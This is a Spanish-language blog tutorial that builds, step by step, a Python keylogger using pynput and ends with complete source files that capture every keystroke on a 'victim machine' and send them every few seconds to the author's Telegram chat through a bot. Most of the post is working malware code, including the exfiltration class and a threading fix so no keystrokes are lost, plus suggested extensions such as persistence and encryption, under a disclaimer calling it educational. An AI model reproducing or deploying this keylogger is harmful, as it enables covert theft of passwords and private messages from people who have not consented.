---
layout: post
permalink: /blog/keylogger-python/
title: "Keylogger en Python: captura de teclado y reporte periódico por Telegram"
date: 2026-06-10
category: blog
tags: [python, keylogger, pynput, telegram, threading]
resumen: "Construimos desde cero un keylogger en Python con pynput: captura de teclas, formateo legible, reporte periódico por Telegram y un problema de concurrencia entre hilos resuelto con threading.Lock."
---

Cada contraseña, cada mensaje, cada comando: todo pasa primero por el teclado. Y capturarlo es más sencillo de lo que parece. En este artículo construimos un keylogger en Python **desde cero**, pero no nos quedamos en imprimir teclas por pantalla: vamos a darle forma de herramienta real, capaz de acumular lo que se teclea y **enviárnoslo al móvil por Telegram** cada pocos segundos.

> **Advertencia**: El siguiente código es exclusivamente para fines educativos en entornos de laboratorio controlados. Su uso fuera de un entorno autorizado es ilegal.

## Qué es un keylogger

Un keylogger es un software diseñado para registrar cada pulsación de tecla realizada en un ordenador. Aunque se asocia frecuentemente con el robo de credenciales, también tiene aplicaciones legítimas en la monitorización de sistemas y auditorías de seguridad.

## Objetivo

Desarrollar un keylogger que cada X tiempo nos envíe mediante mensaje de telegram las pulsaciones de teclado en la máquina víctima.

## Desarrollo

Para desarrollar un keylogger debemos detectar y registrar las pulsaciones que se realizan en el teclado.
Para ello usaremos la librería python *pynput*, la cual permite controlar y monitorizar dispositivos de entrada, como el teclado o el ratón.

Para instalar esta librería ejecutamos el siguiente comando:
```bash
pip3 install pynput
```
> Además de para keyloggers puede ser usada para automatizar tareas y desarrollar macros entre otras tareas del estilo.

```python
import pynput.keyboard
```

El keylogger debe estar siempre escuchando cualquier pulsación, no se nos puede escapar nada, todo es importante. Para ello definimos un listener, el cual nos lo proporciona la librería anteriormente mencionada,
```python
listener = pynput.keyboard.Listener()
```

El listener tiene que esperar pulsaciones de teclas, por ello usamos *on_press*. Este parámetro define lo que llamamos una función de "callback"; es decir, le decimos al programa: "cada vez que detectes una pulsación, pausa lo que estés haciendo, ejecuta esta función pasándole la información de la tecla y luego continúa".  Por cada tecla que reciba la queremos enviar a una función para que trate la tecla y podamos definir que hacer con ese registro de pulsación
```python
listener = pynput.keyboard.Listener(on_press=tecla_pulsada)
```
> Cada vez que detectemos una tecla, la mandamos a la función *tecla_pulsada* donde decidimos que hacer con ella,

```python
def tecla_pulsada(tecla):
    print(tecla)
```
> Como versión inicial vamos a querer que cada tecla que pulse se imprima por pantalla.

Una vez tenemos el listener creado, el siguiente paso es activarlo, pero no solo basta con activarlo, debemos contemplar errores, ya que si por cualquier cosa el keylogger falla, no podemos dejar eso ahí abierto, debemos cerrarlo.

```python
with listener:
    listener.join()
```
> Con el manejador de contexto with no nos tenemos que preocupar por el tipo de error que se acontezca, ante un fallo, cerrará el listener, el cual tambien estamos lanzando aquí con el join.

En este punto tenemos un script que detecta las teclas que pulsamos y las imprime por pantalla

![El keylogger imprimiendo por pantalla cada tecla pulsada](/blog/keylogger-python/assets/01_captura_print_raw.png)

Como vemos el formato en el que se imprimen las teclas no es muy cómodo de leer. Para ello crearemos una variable global donde metamos el registro de todas las teclas, de forma que la función *tecla_pulsada* ya no imprimirá por pantalla, si no que almacenará en esa variable las teclas.

```python
log = ""

def tecla_pulsada(tecla):
    global log # Usamos la variable global en esta función
    log += str(tecla.char)
```

Las pulsaciones son eventos, si metemos esos eventos directamente en el log el keylogger fallará, ya que log espera recibir una cadena, por ello debemos convertir dichos eventos a caracteres.

![Las pulsaciones acumulándose en la variable log](/blog/keylogger-python/assets/02_log_acumulado_char.png)

Esta implementación tiene un problema, funciona bien para los caracteres que tienen su equivalente char, pero teclas como *ctrl*, *esc*, *tab*, no lo tienen. Debido a esto se produce el siguiente error cuando una de ellas es pulsada.

![AttributeError al pulsar una tecla especial sin atributo char](/blog/keylogger-python/assets/03_error_attributeerror_char.png)
> Error al pulsar *CTRL*

Para solucionarlo podemos manejar el error con excepciones, ya que en estos casos solo tenemos que meter *str(tecla)* en el log, no *str(tecla.char)*.

```python
log = ""

def tecla_pulsada(tecla):
    global log

    try:
        log += str(tecla.char)

    except AttributeError:
        log += str(tecla)

    print(log)
```


![Salida tras manejar la excepción con str(tecla)](/blog/keylogger-python/assets/04_log_keyspace_literal.png)

Podemos mejorarlo más, ya que de esta forma no queda especialmente legible.

```python
except AttributeError:
    if tecla == pynput.keyboard.Key.space:
        log += " "
    else:
        log += str(tecla)
```

Con esta modificación tendremos una salida mucho más legible. Solo vamos a contemplar este caso, ya que para el resto es más cómodo ver explícitamente la tecla pulsada. Aun así la salida no es del todo limpia, ya que no deja un espacio después de cada tecla especial, pero no es nada que no podamos tratar.

```python
else:
    log += " " + str(tecla) + " "
```
> Con esta modificación tenemos el problema resuelto.

![Salida con espacios alrededor de las teclas especiales](/blog/keylogger-python/assets/05_log_teclas_especiales_str.png)

Para seguir mejorándolo podríamos quitar lo de **Key** en cada tecla especial.

```python
else:
    log += f" {tecla.name} "
```


![Salida final usando tecla.name, sin el prefijo Key](/blog/keylogger-python/assets/06_log_teclas_especiales_name.png)

Con esto tendríamos el problema solucionado de una manera sencilla.

En este punto ya tenemos una captura de teclas más que aceptable. Ahora el siguiente paso sería que cada X intervalo de tiempo se nos envíe el mensaje al móvil mediante **Telegram** con el contenido almacenado en `log`. Una vez se envíe, `log` debe borrarse.

El keylogger, a la vez que envía el contenido, debe poder seguir escuchando pulsaciones, por lo que aquí debemos meter hilos.

Primero mostraré cómo vamos a manejar los tiempos y el envío, que en este caso será una impresión por pantalla. Una vez tengamos esto implementado, añadiremos las notificaciones por Telegram.

Para manejar esta ejecución periódica podemos utilizar `threading.Timer`. Este nos permite ejecutar una función después de un intervalo de tiempo determinado, sin detener el resto del programa.

Primero importamos la librería:

```python
import threading
```

Ahora vamos a crear una función `report()`, que será la encargada de procesar el contenido almacenado en `log`. En este primer ejemplo no enviaremos nada todavía, simplemente imprimiremos el contenido por pantalla y después limpiaremos la variable.

```python
log = ""

def report():
    global log

    print(log)
    log = ""

    timer = threading.Timer(5, report)
    timer.start()
```

En esta función ocurre lo siguiente:

```python
print(log)
```

Mostramos el contenido acumulado en `log`.

```python
log = ""
```

Después vaciamos la variable para que el siguiente intervalo empiece desde cero.

Por último, definimos el temporizador:

```python
timer = threading.Timer(5, report)
timer.start()
```

Con esto hacemos que la función `report()` se vuelva a ejecutar pasados 5 segundos. Como dentro de `report()` volvemos a crear otro `Timer`, conseguimos que este comportamiento se repita de forma periódica.

Es decir, el flujo sería el siguiente:

```text
Se capturan teclas en log
        ↓
Pasan 5 segundos
        ↓
Se ejecuta report()
        ↓
Se muestra el contenido de log
        ↓
Se borra log
        ↓
Se vuelve a programar report()
```

De esta forma, el listener puede seguir capturando pulsaciones mientras otra parte del programa procesa el contenido acumulado cada cierto intervalo de tiempo.

Sin embargo, tal y como está ahora, tenemos un pequeño problema: el temporizador se crea dentro de la función, pero no tenemos una forma cómoda de cancelarlo si queremos cerrar el programa correctamente.

Para solucionarlo, podemos declarar también una variable global `timer` y una variable `request_shutdown`, que usaremos para indicar si el programa debe seguir creando nuevos temporizadores o no.

```python
log = ""
timer = None
request_shutdown = False

def report():
    global log
    global timer

    print(log)
    log = ""

    if not request_shutdown:
        timer = threading.Timer(5, report)
        timer.start()
```

Ahora el temporizador queda guardado en una variable accesible desde otras partes del código, y además controlamos si debe volver a crearse o no.

La condición:

```python
if not request_shutdown:
```

 sirve para evitar que se programe un nuevo `Timer` cuando ya hemos solicitado cerrar el programa.

Esto nos permite crear una función de apagado.

```python
def shutdown():
    global timer
    global request_shutdown

    request_shutdown = True

    if timer:
        timer.cancel()
```

La función `shutdown()` hace dos cosas:

```python
request_shutdown = True
```

Primero marca que el programa está en proceso de apagado. De esta manera, si `report()` vuelve a ejecutarse, no creará un nuevo temporizador.

Después comprueba si existe un temporizador activo:

```python
if timer:
    timer.cancel()
```

Si existe, lo cancela.

Esto será útil cuando el usuario quiera detener el programa manualmente. Al pulsar `Ctrl + C`, el sistema envía normalmente una señal `SIGINT` al proceso. En Python, esa interrupción se traduce normalmente en una excepción `KeyboardInterrupt`.

Podemos controlar esa salida de esta forma:

```python
try:
    report()

except KeyboardInterrupt:
    shutdown()
    print("\n[!] Saliendo...")
```

En este punto el código ya empieza a tener varias partes relacionadas entre sí: el contenido de `log`, el temporizador, el intervalo de ejecución, la función de reporte, la función de apagado y la captura de teclas. Por este motivo, tiene sentido convertirlo en una clase.

Con esto conseguimos que el estado del keylogger pertenezca al propio objeto, en vez de depender de variables globales.

La clase quedaría de esta manera:

```python
#!/usr/bin/env python3

import pynput.keyboard
import threading


class Keylogger:
    def __init__(self, intervalo=5):
        self.log = ""
        self.intervalo = intervalo
        self.timer = None
        self.request_shutdown = False

    def formatear_tecla(self, tecla):
        try:
            return str(tecla.char)

        except AttributeError:
            if tecla == pynput.keyboard.Key.space:
                return " "
            else:
                return f" {tecla.name} "

    def tecla_pulsada(self, tecla):
        self.log += self.formatear_tecla(tecla)

    def report(self):
        if self.log:
            print(self.log)
            self.log = ""

        if not self.request_shutdown:
            self.timer = threading.Timer(self.intervalo, self.report)
            self.timer.start()

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.tecla_pulsada)

        with listener:
            self.report()
            listener.join()

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()
```

Ahora `log` deja de ser una variable global y pasa a ser un atributo del objeto:

```python
self.log
```

Lo mismo ocurre con el intervalo:

```python
self.intervalo
```

Y con el temporizador:

```python
self.timer
```

Además, añadimos una nueva variable:

```python
self.request_shutdown
```

Esta variable nos permite controlar si el programa debe seguir creando nuevos temporizadores o si se ha solicitado el apagado.

Dentro de `report()` usamos esta condición:

```python
if not self.request_shutdown:
    self.timer = threading.Timer(self.intervalo, self.report)
    self.timer.start()
```

Cuando llamemos a `shutdown()`, cambiaremos ese valor a `True`:

```python
self.request_shutdown = True
```

Y después cancelaremos el temporizador activo:

```python
if self.timer:
    self.timer.cancel()
```

De esta manera, toda la lógica queda agrupada dentro de la clase `Keylogger`: captura de teclas, formateo, almacenamiento, reporte periódico y apagado controlado.

Por último, creamos el archivo `main.py`, que será el encargado de arrancar el programa.

```python
from keylogger import Keylogger


if __name__ == "__main__":
    keylogger = Keylogger(intervalo=5)

    try:
        keylogger.start()

    except KeyboardInterrupt:
        keylogger.shutdown()
        print("\n[!] Saliendo...")
```

En el `main`, primero importamos la clase:

```python
from keylogger import Keylogger
```

Después creamos una instancia del keylogger indicando el intervalo:

```python
keylogger = Keylogger(intervalo=5)
```

En este caso, el contenido acumulado se procesará cada 5 segundos.

Después iniciamos la captura:

```python
keylogger.start()
```

Y finalmente controlamos la salida:

```python
except KeyboardInterrupt:
    keylogger.shutdown()
    print("\n[!] Saliendo...")
```

Cuando el usuario pulse `Ctrl + C`, se lanzará una interrupción de teclado. En vez de dejar que el programa termine directamente, llamamos a `shutdown()` para marcar el apagado y cancelar el temporizador antes de cerrar.

![El keylogger ejecutándose desde la clase y cerrándose con Ctrl + C](/blog/keylogger-python/assets/07_main_clase_ejecucion.png)

Teniendo el funcionamiento de captura de teclas completamente funcional, procedemos a implementar el sistema de envío mediante un bot de telegram.

Para crear el bot:

1. En Telegram buscamos **@BotFather**.
2. Escribimos `/newbot`.
3. Le damos un nombre al bot.
4. Y obtenemos el **token**.

Para el chat_id:

1. Escribimos algo al bot.
2. Vamos a `https://api.telegram.org/botTU_TOKEN/getUpdates`.
3. Copiamos el `chat_id`.

El token y el chat_id es lo que nos hace falta.

La manera de enviar texto al bot de telegram es bastante sencilla.

Queremos hacer una solicitud POST al bot con el contenido del log, y para identificar a donde queremos enviarlo necesitamos el token y el chat_id. Usamos la librería requests y poco más. Le añadimos también un `timeout` para que la petición no se quede colgada indefinidamente si la red falla.

```python
#!/usr/bin/env python3

import requests


class TelegramSender:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id

    def send_telegram(self, log):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"

        data = {
            "chat_id": self.chat_id,
            "text": log
        }

        requests.post(url, data=data, timeout=10)
```

> Nunca publiques tu token ni tu chat_id reales. En el código usa marcadores como `TU_TOKEN` y `TU_CHAT_ID`.

En el `keylogger.py` necesitamos estas modificaciones para que ahora sí envíe texto:

Para integrar el envío en nuestra clase, simplemente pasamos una instancia del `TelegramSender` al constructor del `Keylogger` y lo llamamos dentro del método `report()`.

```python
class Keylogger:
    def __init__(self, intervalo, sender):
        self.log = ""
        self.intervalo = intervalo
        self.timer = None
        self.sender = sender
        self.request_shutdown = False

    # ... (resto de métodos)

    def report(self):
        if self.log:
            self.sender.send_telegram(self.log)
            self.log = ""

        if not self.request_shutdown:
            self.timer = threading.Timer(self.intervalo, self.report)
            self.timer.start()
```

Y el main es el que gestiona todo de esta forma:

```python
from keylogger import Keylogger
from telegram_sender import TelegramSender


if __name__ == "__main__":
    telegram = TelegramSender("TU_TOKEN", "TU_CHAT_ID")
    keylogger = Keylogger(intervalo=5, sender=telegram)

    try:
        keylogger.start()

    except KeyboardInterrupt:
        keylogger.shutdown()
        print("\n[!] Saliendo...")
```

Llegados a este punto el keylogger ya envía las pulsaciones a Telegram, pero hay un detalle que conviene revisar antes de darlo por terminado.

## Un problema de concurrencia

Si observamos con atención el método `report()`, veremos que hay un punto delicado:

```python
def report(self):
    if self.log:
        self.sender.send_telegram(self.log)
        self.log = ""
```

El programa trabaja con **dos hilos diferentes** que acceden al mismo `self.log`:

- El **listener** de `pynput`, que se ejecuta en su propio hilo y va añadiendo teclas con `self.log += ...`.
- El **temporizador**, que ejecuta `report()` en otro hilo distinto.

El problema está en que `send_telegram()` utiliza `requests.post()`, que es una llamada **bloqueante**: la petición HTTP puede tardar alrededor de un segundo en completarse. Durante ese tiempo, el listener **sigue capturando teclas** y añadiéndolas a `self.log`.

Cuando la petición termina, ejecutamos:

```python
self.log = ""
```

y borramos **todo** el contenido, incluidas las teclas que se escribieron durante ese segundo que duró el envío. Esas pulsaciones nunca llegan a enviarse: se pierden.

La solución pasa por **vaciar el buffer antes de enviar**, no después. Guardamos lo que hay pendiente, reseteamos `self.log` de inmediato y enviamos la copia. Así, las teclas que lleguen durante el envío se acumulan en un `self.log` ya limpio y se mandan en el siguiente intervalo.

Además, como dos hilos pueden tocar `self.log` a la vez, protegemos los accesos con un `threading.Lock` para que las operaciones de lectura y escritura no se solapen. El envío por HTTP lo dejamos **fuera** del lock, para no bloquear al listener mientras dura la petición.

Primero añadimos el lock en el constructor:

```python
self.lock = threading.Lock()
```

Protegemos la escritura del listener:

```python
def tecla_pulsada(self, tecla):
    with self.lock:
        self.log += self.formatear_tecla(tecla)
```

Y modificamos `report()` para hacer el intercambio dentro del lock y enviar fuera de él:

```python
def report(self):
    with self.lock:
        pending, self.log = self.log, ""

    if pending:
        self.sender.send_telegram(pending)

    if not self.request_shutdown:
        self.timer = threading.Timer(self.intervalo, self.report)
        self.timer.start()
```

La línea clave es:

```python
pending, self.log = self.log, ""
```

Con ella copiamos el contenido actual en `pending` y dejamos `self.log` vacío en una sola operación. A partir de ahí trabajamos con `pending` para el envío, y `self.log` ya está listo para seguir acumulando nuevas pulsaciones sin riesgo de perder nada.

Con esta mejora, el `keylogger.py` final queda así:

```python
#!/usr/bin/env python3

import pynput.keyboard
import threading


class Keylogger:
    def __init__(self, intervalo, sender):
        self.log = ""
        self.intervalo = intervalo
        self.timer = None
        self.sender = sender
        self.request_shutdown = False
        self.lock = threading.Lock()

    def formatear_tecla(self, tecla):
        try:
            return str(tecla.char)
        except AttributeError:
            if tecla == pynput.keyboard.Key.space:
                return " "
            return f" {tecla.name} "

    def tecla_pulsada(self, tecla):
        with self.lock:
            self.log += self.formatear_tecla(tecla)

    def report(self):
        with self.lock:
            pending, self.log = self.log, ""

        if pending:
            self.sender.send_telegram(pending)

        if not self.request_shutdown:
            self.timer = threading.Timer(self.intervalo, self.report)
            self.timer.start()

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.tecla_pulsada)

        with listener:
            self.report()
            listener.join()

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()
```

Con todo esto en su sitio, ya podemos lanzar el keylogger y comprobar el flujo completo de principio a fin.

Arrancamos el programa desde `main.py` y empezamos a escribir con normalidad. El listener va capturando cada pulsación y acumulándola en `log`, mientras el temporizador trabaja en segundo plano esperando a que se cumpla el intervalo.

![El keylogger en ejecución, capturando las pulsaciones en segundo plano](/blog/keylogger-python/assets/08_keylogger_en_ejecucion.png)
> El keylogger en ejecución, capturando las pulsaciones en segundo plano.

Cada vez que se cumple el intervalo definido, `report()` vacía el buffer y envía el contenido acumulado a nuestro chat. En el móvil vamos recibiendo, mensaje a mensaje, todo lo que se ha tecleado en la máquina víctima.

![Las pulsaciones llegando a Telegram cada cierto intervalo de tiempo](/blog/keylogger-python/assets/09_telegram_recepcion.png)
> Las pulsaciones llegando a Telegram cada cierto intervalo de tiempo.

## Conclusión

Con esto cerramos el proyecto: tenemos un keylogger funcional que captura pulsaciones, las formatea de manera legible, las acumula sin perder contenido durante los envíos y nos las hace llegar de forma periódica a Telegram.

A partir de esta base hay margen para seguir ampliándolo: enviar el log a otros canales, cifrar el contenido antes de transmitirlo, añadir persistencia o capturar otros eventos del sistema. Cada extensión es también una oportunidad para entender, desde el lado defensivo, cómo se detecta y mitiga este tipo de técnica.

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados.
